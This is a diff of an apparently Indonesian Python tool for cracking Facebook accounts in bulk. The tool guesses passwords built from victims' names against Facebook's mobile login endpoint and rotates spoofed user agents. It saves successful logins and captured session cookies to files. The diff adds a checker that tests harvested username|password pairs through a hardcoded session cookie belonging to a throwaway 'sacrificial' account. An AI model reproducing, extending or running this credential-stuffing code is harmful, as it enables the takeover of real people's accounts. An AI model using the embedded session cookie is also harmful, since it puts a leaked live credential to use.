@@ -191,8 +191,10 @@ for x in range(10):
 	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 	
 ip = requests.get('https://api.ipify.org').text
-try:aan = open('user-agents_infinix.txt','r').read().splitlines()
-except:aan = ["Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"]
+#wanji = requests.get('https://user-agents.net/download?browser=facebook&download=txt').text
+
+try:aan = open('samsung.txt','r').read().splitlines()
+except:aan = ["Mozilla/5.0 (Linux; Android 11; Mi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]."]
 
 def uaku():
 	try:
@@ -250,6 +252,71 @@ bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+
+class Yowaimo:
+	
+    def __init__(self):
+        self.ses=requests.Session()
+        #self.cok = open('.cok.txt','r').read()
+        self.cok = {"cookie": "dbln=%7B%22100093071481470%22%3A%22hdYrx29H%22%7D; datr=s0d6ZLY35wT_r-mvMwdkN2Wl; sb=s0d6ZLNBdZOYvQu5HHHjhsae; c_user=100093071481470; xs=12%3Af_1FcnHttwlZ-g%3A2%3A1685735357%3A-1%3A-1; fr=0RSPdApxBoVCSFXAP.AWWYwPkCazxmRsEGXxzwZXg2HRo.Bkeke9.Fu.AAA.0.0.Bkeke9.AWUY790FNXk; m_page_voice=100093071481470; "}
+       # os.system("clear")
+        self.cek()
+
+    def cek(self):
+        cp = []
+        try:
+            xxx = os.listdir("result")
+            for z in xxx:
+                cp.append(z)
+        except:pass
+        if len(cp)==0:
+            exit("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
+        else:
+            xa, xx = {}, 0
+            for x in cp:
+                try:xz = open(f"result/{x}").readlines()
+                except:continue
+                xx+=1
+                if xx<100:
+                    nom = ""+str(xx)
+                    xa.update({str(xx):str(x)})
+                    xa.update({nom+"0":str(xx)})
+                    print(f" {nom}. {x} total: {str(len(xz))}")
+                else:
+                    xa.update({str(xx):str(x)})
+                    print(f" {nom}. {x} total: {str(len(xz))}")
+        file = input(" [?] nomor : ")
+        pemi = input(" [?] Pemisah : ")
+        try:ajg = xa[file]
+        except KeyError:
+            print("input yang bener")
+        try:
+            fi = open(f"result/{ajg}").readlines()
+        except FileNotFoundError:
+            print("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
+        for yxz in fi:
+            user = yxz.replace("\n", "")
+            usez = user.split(pemi)
+            self.log_hasil(usez[0], usez[1])
+
+    def log_hasil(self, user, pasw):
+        try:
+            link = self.ses.get(f"https://mbasic.facebook.com/{user}/friends", cookies=self.cok).text
+            #exit(link)
+            cari = re.findall('<h3 class\=\".*?">(.*?)</h3>', link)
+            if "mbasic_logout_button" not in str(link):
+                exit(f"\n[{M}!{N}] akun tumbal anda terkena checkpoint, silahkan beralih akun")
+            elif "Anda Diblokir Sementar" in str(link):
+                exit(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun")
+            elif "/zero/optin/write" in str(link):
+                exit(f"\n[{M}!{N}] akun tumbal anda menggunakan free Facebook, silahkan ubah ke mode data.")
+            elif "0" in str(len(cari)):
+                print(f"{K}[CP] {user}|{pasw}{N}")
+                open("result/CP.txt", "a").write(f"{user}|{pasw}\n")
+            else:
+                print(f"{H}[OK] {user}|{pasw} {cari[0]}{N}")
+                open("result/OK.txt", "a").write(f"{user}|{pasw}\n")
+        except Exception as e:exit(e)
 
 def coli(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
@@ -368,12 +435,15 @@ def menu(my_name,my_id):
 	print(f'{P}─────────────────────────────────────────────────────\n')
 	print(f'{P} ┌─[{H}1{P}] Crack Publik')
 	print(f'{P} ├─[{H}2{P}] Hasil Crack')
+	print(f'{P} ├─[{H}3{P}] Cek Cp :)')
 	print(f'{P} ├─[{H}0{P}] Hapus Cookie')
 	janda = input(f' └───➢ ')
 	if janda in ['1']:
 		dump_massal()
 	elif janda in ['2']:
 		result()
+	elif janda in ['3']:
+		Yowaimo()
 	elif janda in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
@@ -602,7 +672,6 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
-					pwv.append(frs+'234')
 					pwv.append(frs+'321')
 			else:
 				if len(frs)<3:
@@ -613,7 +682,6 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
-					pwv.append(frs+'234')
 					pwv.append(frs+'321')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
@@ -646,6 +714,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])
+	#sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}│{b}{len(id)}{P}│{ewe}{idf}{P}][Ok:{H}{ok}{P}][Cp:{k}{cp}{P}] ")
 	sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}/{b}{len(id)}{P}]—[{H}{ok}{P}]—[{k}{cp}{P}] ")
 	sys.stdout.flush()
 	ua = random.choice(aan)
@@ -663,7 +732,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#print(f'\r{P}└─ {k}{idf}{P}|{k}{pw}{N}')     
-				print(f'\r{P} 😔 {k}{idf}{P}|{k}{pw}\n └─ {azu} {ua} {P}\n ')
+				print(f'\r{P} 😔 {k}{idf}{P}|{k}{pw}\n └─ {P} {ua} \n ')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -672,7 +741,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{P} 😋 {H}{idf}{P}|{H}{pw}\n{P}└─ {H}{kuki}{N}\n└─ {ua}{N}\n')
+				print(f'\r{P} 😋 {H}{idf}{P}|{H}{pw}\n{P} └─ {H}{kuki}{N}\n └─ {ua}{N}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(session,coki)
 				break
@@ -688,7 +757,7 @@ def crack2(idf,pwv):
 	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])
 	sys.stdout.write(f"\r{P}└──[{ewe}{loop}{P}│{b}{len(id)}{P}│{ewe}{idf}{P}][Ok:{H}{ok}{P}][Cp:{k}{cp}{P}]  ")
 	sys.stdout.flush()
-	ua = random.choice(ugen)
+	ua = random.choice(aan)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
